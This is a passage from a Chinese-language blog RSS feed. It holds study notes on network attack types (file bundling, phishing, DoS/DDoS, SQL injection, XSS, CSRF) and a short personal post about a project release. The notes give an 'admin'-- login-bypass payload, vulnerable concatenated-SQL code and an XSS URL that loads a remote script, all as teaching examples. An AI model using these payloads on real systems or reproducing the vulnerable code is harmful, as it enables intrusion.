+&lt;p&gt;多文件捆绑方式是最简单的捆绑方式，捆绑时手动构建一个空白PE文件，将待捆绑文件全部附加到新文件尾，并记下开始位置和文件大小作为偏移量存在新文件的PE头中，使得该文件运行时会顺序执行所有待捆绑文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;资源融合捆绑方式&lt;/p&gt;
+&lt;p&gt;PE头中的资源区段包含文件调用的资源信息，捆绑者可以将待捆绑文件作为资源信息通过更新的方式写入被捆绑文件头文件以达到捆绑的目的&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;漏洞利用捆绑方式&lt;/p&gt;
+&lt;p&gt;漏洞利用方式将不同漏洞触发代码、shellcode和待捆绑程序写入载体文件中，一旦打开这些载体文件的应用程序存在对应漏洞，漏洞触发代码就会被执行，然后通过shellcode跳转到待捆绑程序执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;钓鱼网站&lt;/p&gt;
+&lt;p&gt;钓鱼网站是一种黑客实施网络欺诈的伪造网站。为窃取用户信息而伪造真实网站，一般与真实网站有相似域名和相同页面，技术含量不高，主要利用人们的心理和社会工程学方法诱骗受害者上钩，一旦受害者填写敏感资料便会导致信息泄漏，甚至带来经济损失&lt;/p&gt;
+&lt;p&gt;钓鱼网站可以和DNS欺骗等网络协议欺骗技术结合使用，使其更具迷惑性&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;社会工程学&lt;/p&gt;
+&lt;p&gt;社会工程学(Social Engineering，又称社交工程学)于上世纪60年代建立，目的是建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题，是一门针对受害者好奇心、贪婪、心理弱点、本能反应等特点而采取的欺骗、陷阱、伤害等危害手段，以取得利益回报的学问&lt;/p&gt;
+&lt;p&gt;社会工程学主要分为公安社会工程学和网络社会工程学。诱骗式攻击的深层本质是对社会工程学的实际应用&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;软件漏洞攻击利用技术&lt;/h3&gt;
+&lt;p&gt;软件漏洞是指计算机系统中的软件在具体的实现、运行、机制、策略上存在的缺陷或者脆弱点。软件漏洞一旦被利用，最坏的情况可以获得计算机系统的额外权限，使攻击者能够在未授权的情况下对计算机系统的安全造成损坏&lt;/p&gt;
+&lt;p&gt;软件漏洞攻击技术可以分为直接网络攻击技术和诱骗式网络攻击技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;直接网络攻击&lt;/p&gt;
+&lt;p&gt;直接网络攻击指攻击者直接通过网络对目标系统发起主动攻击。针对队外提供开放网络服务的操作系统服务程序漏洞可以直接通过网络攻击方式发起攻击&lt;/p&gt;
+&lt;p&gt;2001年“红色代码”病毒利用Microsoft IIS服务程序处理请求数据时存在缓冲区溢出漏洞&lt;/p&gt;
+&lt;p&gt;2002年“冲击波”病毒利用Microsoft RPC处理TCP/IP消息时存在缓冲区溢出漏洞&lt;/p&gt;
+&lt;p&gt;2004年“震荡波”病毒利用Microsoft LSASS服务中的缓冲区溢出漏洞&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;诱骗式网络攻击&lt;/p&gt;
+&lt;p&gt;对于没有开放网络端口不提供对外服务的软件漏洞，攻击者无法通过网络发起攻击，因而只能使用诱骗式网络攻击，诱骗式网络攻击分为基于网站的间接式诱骗网络攻击和网络传播本地诱骗点击攻击&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基于网站的诱骗式间接网络攻击&lt;/p&gt;
+&lt;p&gt;对于浏览器软件或其他需要处理网页的软件漏洞，攻击者可以通过搭建网站或篡改被其控制的网站结合网站挂马技术将含有漏洞触发代码的文件或脚本嵌入到网页中诱使用户访问，其软件中的漏洞便会被触发，从而实现漏洞利用攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络传播本地诱骗点击攻击&lt;/p&gt;
+&lt;p&gt;对于其他软件中的本地执行漏洞，需要在本地执行漏洞利用程序才能触发。因此，攻击者需要先通过诱骗下载等技术使用户将含漏洞触发代码的文件保存到本地并运行才能实现漏洞利用攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;拒绝服务攻击&lt;/h3&gt;
+&lt;p&gt;服务拒绝攻击(Denial of Service,DoS)是指攻击者向目标计算机发出数量众多的攻击数据包，消耗目标计算机大量网络宽带和计算机资源，使得目标计算机没有剩余宽带和资源给正常用户的服务请求提供响应的一种攻击方式。这种攻击方式缺乏有效的防御手段，危害十分巨大&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;微软表示，它在去年8月份抵御了 2.4Tbps 的分布式拒绝服务（DDoS）攻击。这次攻击的目标是欧洲的一个 Azure 客户，比微软在 2020 年的最高攻击带宽量高出 140%，还超过了去年针对亚马逊 Web 服务的 2.3Tbps 最大攻击&lt;/p&gt;
+&lt;p&gt;微软表示，这次攻击持续了 10 多分钟，短暂的流量爆发达到了 2.4Tbps、0.55Tbps，最后一次为 1.7Tbps&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;今年8月，Google报告称发现一次大规模DDoS，对方尝试关闭其Cloud Armor服务，峰值达每秒4600万个请求(RPS)，规模相当于此前记录的176.92%，这使其成为有史以来最大的一次分布式拒绝服务攻击&lt;/p&gt;
+&lt;p&gt;谷歌解释说，在高峰期，这种攻击相当于在 10 秒内实现一整天的 Wikipedia 访问量，因此能够抵御如此强大的 DDoS 攻击是一项令人难以置信的壮举&lt;/p&gt;
+&lt;p&gt;谷歌的研究人员详细介绍了来自HTTPS DDoS事件的流量是通过132个国家的5256个IP地址发送的。分析攻击的来源表明，Mēris参与了攻击，它是之前两个DDoS记录保有量(分别为1720万RPS和2180万RPS)背后的僵尸网络&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;IP层协议攻击&lt;/p&gt;
+&lt;p&gt;IP层协议的攻击是DoS最低层次的攻击，攻击方通过大量发送ICMP和IGMP协议的请求数据包使目标主机的资源全部用于应答这些数据包，从而造成目标主机的拒绝服务，完全靠数量取胜，不需要太多策略&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP协议攻击&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;TCP SYN-Flood TCP ACK-Flood&lt;/p&gt;
+&lt;p&gt;TCP SYN-Flood和ACK-Flood攻击是利用TCP协议本身安全缺陷的攻击，两者均事用伪造IP向目标主机发送大量TCP握手数据包，在目标主机形成大量半开连接，消耗极大系统资源直到耗尽&lt;/p&gt;
+&lt;p&gt;TCP SYN-Flood和ACK-Flood因其要使用大量数据包才能达到攻击目的，所以得名“洪水攻击”，二者区别在于SYN-Flood发送第一次握手请求数据包，而ACK-Flood发送ACK标志为1的数据包&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP全连接攻击&lt;/p&gt;
+&lt;p&gt;TCP全连接攻击中，攻击者计算机发起多个线程连接目标主机TCP服务端口，然后断开重复连接，不断循环，可以很快导致目标端口的连接资源被耗尽，但很容易被防火墙识别&lt;/p&gt;
+&lt;p&gt;另一种方法是保持长时间连接使目标计算机资源耗尽而崩溃，这种攻击看起来非常像对目标主机的合法网络访问，防火墙难以识别和防御，但需要大量协助攻击的僵尸计算机&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;UDP协议攻击&lt;/p&gt;
+&lt;p&gt;UDP-Flood是一种宽带消耗型DoS，攻击者制造出巨大流量的UDP数据包发送到目标主机从而完全占满目标主机的网络宽带，达到拒绝服务效果&lt;/p&gt;
+&lt;p&gt;如果对53端口上的DNS服务器发动DoS大量查询不存在域名，还会导致DNS服务器向上级服务器发送大量递归查询数据包，产生连锁反应&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;应用层协议攻击&lt;/p&gt;
+&lt;p&gt;应用层协议的DOS攻击是脚本洪水攻击。攻击者利用代理服务器对Web服务器发出大量HTTP GET请求，如果对方是动态Web服务器，大量的GET请求会对后端数据库造成极大负载甚至无法正常响应，从而达到拒绝服务效果&lt;/p&gt;
+&lt;p&gt;由于发送HTTP请求需要建立正常的TCP连接，因而会暴露攻击者IP地址&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DDoS&lt;/p&gt;
+&lt;p&gt;分布式拒绝服务攻击(Distributed DoS,DDoS)攻击是在DoS基础上大量控制第三方计算机辅助其进行攻击的一种攻击方式&lt;/p&gt;
+&lt;p&gt;由于攻击者主机性能往往低于目标主机，因此DoS攻击效果并不明显，此时攻击者可以将其非法控制的分布于各地的大量计算机统一协调起来，向目标计算机发起DoS攻击，造成的流量使高性能的目标主机也无法承受，同时由于攻击流量来自不同IP地址，防火墙难以分辨和防御，因而这种攻击往往会获得比较好的效果&lt;/p&gt;
+&lt;p&gt;DDoS攻击由攻击者、主控端和代理端（肉鸡）组成，主控端和代理端上都安装了攻击者的远程控制程序，主控端主机可以接受命令并操作代理端完成对目标主机的攻击&lt;/p&gt;
+&lt;p&gt;DDoS攻击中的主控端和代理端如同僵尸一般在浑然不觉中发动攻击，因此DDoS攻击利用的网络被称为僵尸网络。DDoS最初利用互联网中的计算机设备发动，2015年以来DDoS利用的网络拓展到物联网。近年来，IoT设备大多接入互联网，但处理性能低下，人们对其安全重视程度普遍不高，攻击者可以轻松地对这些设备发起攻击实现远程控制，使得路由器、摄像头和工业控制系统等一类设备成为代理端的理想选择，也成为了DDoS流量的主要来源&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Web脚本攻击&lt;/h3&gt;
+&lt;p&gt;Web脚本攻击总体上指针对Web网站发起的攻击。Web安全可以分为Web服务器端应用安全和Web客户端脚本安全。针对Web客户端发起的攻击技术主要包括跨站脚本攻击、跨站请求伪造攻击、点击劫持攻击等，针对Web服务端发起的攻击技术主要包括注入攻击、访问控制攻击、非授权的认证和会话攻击等。&lt;/p&gt;
+&lt;p&gt;据OWASP（Open Web Application Security Project，开源Web应用安全项目）调查显示，Web应用的前十大安全风险分别是：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;注入式攻击&lt;/li&gt;
+&lt;li&gt;跨站脚本攻击&lt;/li&gt;
+&lt;li&gt;错误的认证和会话管理&lt;/li&gt;
+&lt;li&gt;不安全的直接对象引用&lt;/li&gt;
+&lt;li&gt;跨站请求伪造&lt;/li&gt;
+&lt;li&gt;不安全的配置管理&lt;/li&gt;
+&lt;li&gt;失败的URL访问限制&lt;/li&gt;
+&lt;li&gt;未验证的网址重定向和传递&lt;/li&gt;
+&lt;li&gt;不安全的加密存储&lt;/li&gt;
+&lt;li&gt;不安全的传输层保护&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;注入攻击&lt;/p&gt;
+&lt;p&gt;注入漏洞是Web中广泛存在的漏洞类型，基本原理是利用Web程序对用户输入请求中的非法字符过滤不严使Web程序将用户输入的异常字符当作正常代码执行，从而使用户在未授权情况下非法获取Web服务器信息。&lt;/p&gt;
+&lt;p&gt;注入攻击主要包括SQL注入、代码注入、命令注入、LDAP注入、XPath注入等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;SQL注入&lt;/p&gt;
+&lt;p&gt;SQL（Standard Query Language，标准查询语言）是大多数数据库使用的查询语言，用户输入的条件会被拼接成完整SQL语句发送到数据库进行查询，在此过程中如果没有对输入进行严格检查，就会产生SQL注入漏洞。&lt;/p&gt;
+&lt;p&gt;如以下SQL语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM tb_users WHERE userid=&apos;admin&apos; AND passwd=&apos;passwd&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其作用是查询tb_users表中userid字段为admin、passwd字段为passwd的所有记录，如果查询到对应记录，则身份认证通过，用户可以登录。&lt;/p&gt;
+&lt;p&gt;如果服务端使用以下方式直接拼接字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;String passwd = request.getParameter(&quot;passwd&quot;);
+String username = request.getParameter(&quot;user&quot;);
+String sql = &quot;SELECT * FROM tb_users WHERE userid=&apos;&quot; + username + &quot;&apos; AND passwd=&apos;&quot; + passwd + &quot;&apos;&quot;;
+PreparedStatement ps = connect.prepareStatement(sql);
+Result rs = ps.executeQuery();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那么当用户提交userid字段为admin&apos;--时，实际发送到服务端数据库中的SQL语句为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM tb_users WHERE userid=&apos;admin&apos;--&apos; AND passwd=&apos;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中&lt;code&gt;--&lt;/code&gt;为SQL中的注释符号，其后内容都将被忽略，数据库实际解析到的SQL语句为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM tb_users WHERE userid=&apos;admin&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该语句将在不验证密码的情况下返回用户admin的记录，服务器web应用程序便会误以为该攻击者已通过身份验证，攻击者得以绕过鉴权获得非法信息甚至登入特殊账户对系统进行更改&lt;/p&gt;
+&lt;p&gt;对于以上实例，可以通过预编译来避免&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;String passwd = request.getParameter(&quot;passwd&quot;);
+String username = request.getParameter(&quot;user&quot;);
+String sql = &quot;SELECT * FROM tb_users WHERE userid= ? AND passwd= ?&quot;;
+PreparedStatement ps = connect.prepareStatement(sql);
+ps.setString(username,passwd);
+Result rs = ps.executeQuery();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于传入向查询语句（PerparedStatement对象）传入参数时，语句已经经过预编译，语义已经固定，因而所有传入的参数都将无条件视为字符串被嵌入执行而不会引发注入攻击了&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;跨站脚本攻击&lt;/p&gt;
+&lt;p&gt;跨站脚本攻击（Cross-Site Scripting，本应缩写作CSS，但为防止与层叠样式表(Cascading Style Sheets, CSS)混淆而缩写作XSS）利用Web客户端程序对Web页面中输入的数据过滤不严或未进行过滤的漏洞，向Web页面中插入恶意代码，用户浏览该页面时浏览器会自动执行这些代码，从而实现在用户浏览器中显示恶意脚本、控制用户浏览器或窃取用户资料的目的。&lt;/p&gt;
+&lt;p&gt;如以下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;var username = window.location.search.substr(1).match(new RegExp(&quot;(^|&amp;amp;)username=([^&amp;amp;]*)(&amp;amp;|$)&quot;));
+document.write(&quot;Hello &quot;+username);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果攻击者诱导用户发送以下请求&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://www.xss.com/xss?username=&amp;lt;script src=&quot;xss.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;浏览器便会解析执行xss.js文件中的攻击脚本&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;反射型XSS&lt;/p&gt;
+&lt;p&gt;反射型XSS也叫非持久型XSS（None-Persistent Cross-Site Scripting），一般是攻击者向受害者发送一个带有恶意脚本的URL，然后诱导用户点击以实现XSS，如上述例子便是典型的反射性XSS攻击。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;存储型XSS&lt;/p&gt;
+&lt;p&gt;与反射型相对，存储型XSS又被称作持久型XXS（Persistant Cross-Site Scripting），攻击者一般会将恶意脚本存储在Web服务端的页面中，一般是嵌入在博客或BBS类型网站的帖子中，当用户浏览该帖子时，嵌入在其中的XSS脚本便会被浏览器解析执行，导致跨站脚本漏洞攻击。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DOM-Based XSS&lt;/p&gt;
+&lt;p&gt;DOM（Document Object Model，文档对象模型）是HTML实现的一种编程接口。我们熟悉的Web页面均是由一棵包含多个、多层节点的DOM树组成的。它并非按照攻击数据是否存储在服务端划分，而是按照其效果：改变了DOM树划分。&lt;/p&gt;
+&lt;p&gt;上述例子在文档中添加了一个&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;标记节点，因而也是一个DOM-Based XSS。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;跨站请求伪造&lt;/p&gt;
+&lt;p&gt;跨站请求伪造攻击（Cross Site Request Forgery，CSRF）是在XSS基础上建立的变种。&lt;/p&gt;
+&lt;p&gt;跨站请求伪造攻击利用浏览器不同页面之间共享同域会话认证信息的机制。当用户登录某一个Web应用后，该应用会返回给浏览器会话认证信息，即Cookie数据，此后对该应用的所有请求浏览器都会在请求中附加Cookie数据，Web服务器以此对该请求进行鉴权。&lt;/p&gt;
+&lt;p&gt;攻击者往往通过XSS使受害者在无意中向被攻击Web应用发送请求，而该请求会被浏览器自动加上Cookie数据，使得攻击者在受害者毫不知情的情况下利用其身份对Web应用发送了请求，攻击者可以以此获得该Web应用中关于被害者的敏感数据或篡改相关数据。&lt;/p&gt;
+&lt;p&gt;CSRF可以通过跨域策略来进行初步防范。当浏览器向Web服务器发送异步请求（AJAX）时，Web服务器向浏览器返回的数据中会包含一个cross-origin-resource-policy信息规定跨域策略和一个access-control-allow-origin信息规定可以跨域访问该请求的域，如果信息不符，浏览器便会拒绝处理该请求。此外，CSRF还可以通过敏感操作让用户手动输入验证码和在请求中加入客户端服务端同步生成的随机数来防范。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;远程控制&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;木马&lt;/li&gt;
+&lt;li&gt;Webshell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;网络安全防护技术&lt;/h2&gt;
+&lt;h3&gt;防火墙&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;包过滤技术&lt;/li&gt;
+&lt;li&gt;状态检测技术&lt;/li&gt;
+&lt;li&gt;地址翻译技术&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;入侵检测与入侵防御系统&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;误用检测技术&lt;/li&gt;
+&lt;li&gt;异常检测技术&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;PKI&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;数字证书&lt;/li&gt;
+&lt;li&gt;证书认证机构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;VPN&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;第二层隧道协议&lt;/li&gt;
+&lt;li&gt;MPLS VPN&lt;/li&gt;
+&lt;li&gt;第三层隧道协议&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;网络安全协议&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;SSL&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>写于v1.0.1_DEV发布</title><link>https://ssl.ztsubaki.xyz/posts/1/1/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/1/1/</guid><description>我将一直前行</description><pubDate>Mon, 03 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;em&gt;三年，对于一个人意味着什么——&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;五年，对于一个人又意味着什么——&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;该项目于2021年确立。经过一年漫长的等待，在2022年开启，并于今日发布第一个DEV版本。&lt;/p&gt;
+&lt;p&gt;这是一个三年不变的初心，也是一份五年的坚守。&lt;/p&gt;
+&lt;p&gt;这是一个梦想的结晶，以此为见证，这个梦将结出更多果实。&lt;/p&gt;
+&lt;p&gt;三年时光如风一般拂过，而一切早已物是人非，唯有初心不变。三年可以改变一个人，也可以让梦想结出果实。一切如同梦一般，大梦初醒一切早已改变，无法回溯。&lt;/p&gt;
+&lt;p&gt;即使付出了多少，即使浪费了多少，即使被多少人阻拦，当第一次打印出&lt;code&gt;Holle, World&lt;/code&gt;，当第一次写出一个HTML，第一次写出一个窗口，第一次编译出exe，第一次写出查询数据库，第一次项目化开发...你会发现，这一切都是值得的。&lt;/p&gt;
+&lt;p&gt;一切都是值得的。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;“尽管此刻我一无所有  你不懂我热爱的一切”&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我将满怀希望与热爱，继续前行。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;写于2022年10月3日 凌晨 JackDavidZhang_HOME v1.0.1_DEV发布&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;离写下上述文字已经过去了两年，该项目在今年年末出于课程要求进行了一次修改与重构，并计划发布2.0版本，然而结果仍然不尽人意。&lt;/p&gt;
+&lt;p&gt;这两年间改变了太多，我经历了一次又一次的挫折，也一次又一次认识到自己的不足。&lt;/p&gt;
+&lt;p&gt;我还需要学习更多。&lt;/p&gt;
+&lt;p&gt;在发布了两个Alpha版本后，我决定搁置该项目，暂时用这个网站替代原有的网站。&lt;/p&gt;
+&lt;p&gt;但是热爱永远不会改变，我仍将继续前行。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;写于2024年12月26日晚 ZTsubaki_HOME_fuwari投入使用&lt;/strong&gt;&lt;/p&gt;
+</content:encoded></item></channel></rss>
